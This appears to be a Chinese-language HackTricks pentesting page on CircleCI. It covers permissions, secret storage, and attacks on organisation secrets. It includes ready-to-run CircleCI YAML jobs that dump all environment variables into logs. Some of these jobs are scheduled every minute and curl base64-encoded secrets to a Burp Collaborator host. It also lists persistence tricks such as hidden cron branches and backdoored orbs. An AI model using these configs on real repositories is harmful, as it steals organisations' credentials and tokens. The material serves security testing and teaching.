# CircleCI 安全

{{#include ../banners/hacktricks-training.md}}

### 基本信息

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) 是一个持续集成平台，您可以在其中**定义模板**，指示您希望它对某些代码做什么以及何时执行。通过这种方式，您可以**自动化测试**或**部署**，例如直接**从您的代码库主分支**进行。

### 权限

**CircleCI** **继承了**与登录的**账户**相关的github和bitbucket的权限。\
在我的测试中，我检查到，只要您在github上对代码库拥有**写权限**，您就能够**管理CircleCI中的项目设置**（设置新的ssh密钥，获取项目api密钥，使用新的CircleCI配置创建新分支...）。

然而，您需要是**代码库管理员**才能**将代码库转换为CircleCI项目**。

### 环境变量和秘密

根据[**文档**](https://circleci.com/docs/2.0/env-vars/)，在工作流中有不同的方法来**加载环境变量中的值**。

#### 内置环境变量

每个由CircleCI运行的容器将始终具有[**文档中定义的特定环境变量**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)，如`CIRCLE_PR_USERNAME`、`CIRCLE_PROJECT_REPONAME`或`CIRCLE_USERNAME`。

#### 明文

您可以在**命令**中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
您可以在 **run environment** 中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
您可以在 **build-job environment** 中以明文声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
您可以在 **容器的环境** 中以明文声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### 项目秘密

这些是**秘密**，只有**项目**（通过**任何分支**）可以**访问**。\
您可以在 _https://app.circleci.com/settings/project/github/\<org_name>/\<repo_name>/environment-variables_ 中查看它们的**声明**。

![](<../images/image (129).png>)

> [!CAUTION]
> "**导入变量**" 功能允许从其他项目**导入变量**到这个项目。

#### 上下文秘密

这些是**组织范围内**的秘密。默认情况下，**任何仓库**都可以**访问**存储在这里的任何秘密：

![](<../images/image (123).png>)

> [!TIP]
> 但是，请注意，可以选择不同的组（而不是所有成员）来**仅向特定人员提供秘密的访问权限**。\
> 这目前是**提高秘密安全性**的最佳方法之一，不允许所有人访问，而只是一些人。

### 攻击

#### 搜索明文秘密

如果您有**访问VCS**（如github），请检查**每个仓库每个分支**的文件 `.circleci/config.yml` 并**搜索**潜在的**明文秘密**。

#### 秘密环境变量和上下文枚举

检查代码，您可以找到在每个 `.circleci/config.yml` 文件中**使用**的**所有秘密名称**。您还可以从这些文件中获取**上下文名称**，或在网页控制台中查看：_https://app.circleci.com/settings/organization/github/\<org_name>/contexts_。

#### 外泄项目秘密

> [!WARNING]
> 为了**外泄所有**项目和上下文的**秘密**，您**只需**对整个github组织中的**1个仓库**拥有**写入**权限（_并且您的账户必须有访问上下文的权限，但默认情况下每个人都可以访问每个上下文_）。

> [!CAUTION]
> "**导入变量**" 功能允许从其他项目**导入变量**到这个项目。因此，攻击者可以**导入所有仓库的所有项目变量**，然后**一起外泄所有变量**。

所有项目秘密始终在作业的环境中设置，因此只需调用环境并将其混淆为base64，就会在**工作流网页日志控制台**中外泄秘密：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
如果您**无法访问网络控制台**，但您有**对代码库的访问权限**并且知道使用了CircleCI，您可以**创建一个工作流**，该工作流**每分钟触发一次**并且**将秘密导出到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### 导出上下文秘密

您需要**指定上下文名称**（这也将导出项目秘密）：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
如果您**无法访问网络控制台**，但您有**对代码库的访问权限**并且知道使用了CircleCI，您可以**修改一个每分钟触发的工作流**，并且该工作流**将秘密导出到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
> [!WARNING]
> 仅仅在一个仓库中创建一个新的 `.circleci/config.yml` **并不足以触发 circleci 构建**。你需要在 **circleci 控制台中将其启用为项目**。

#### 逃往云端

**CircleCI** 让你可以选择在 **他们的机器上或你自己的机器上运行构建**。\
默认情况下，他们的机器位于 GCP，你最初无法找到任何相关信息。然而，如果受害者在 **他们自己的机器上（可能是在云环境中）** 运行任务，你可能会找到一个 **包含有趣信息的云元数据端点**。

请注意，在之前的示例中，一切都是在 docker 容器内启动的，但你也可以 **请求启动一台虚拟机**（这可能具有不同的云权限）：
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
或者甚至是一个可以访问远程 docker 服务的 docker 容器：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### 持久性

- 可以在 CircleCI 中 **创建** **用户令牌** 以使用用户的访问权限访问 API 端点。
- _https://app.circleci.com/settings/user/tokens_
- 可以 **创建项目令牌** 以使用令牌授予的权限访问项目。
- _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
- 可以 **向项目添加 SSH 密钥**。
- _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
- 可以在一个意外的项目中 **创建一个隐藏分支的 cron 作业**，每天 **泄露** 所有 **上下文环境** 变量。
- 或者甚至在一个分支中创建/修改一个已知的作业，每天 **泄露** 所有上下文和 **项目机密**。
- 如果你是 GitHub 的所有者，你可以 **允许未验证的 orbs** 并在作业中将其配置为 **后门**。
- 你可以在某些任务中找到 **命令注入漏洞** 并通过 **秘密** 修改其值来 **注入命令**。

{{#include ../banners/hacktricks-training.md}}
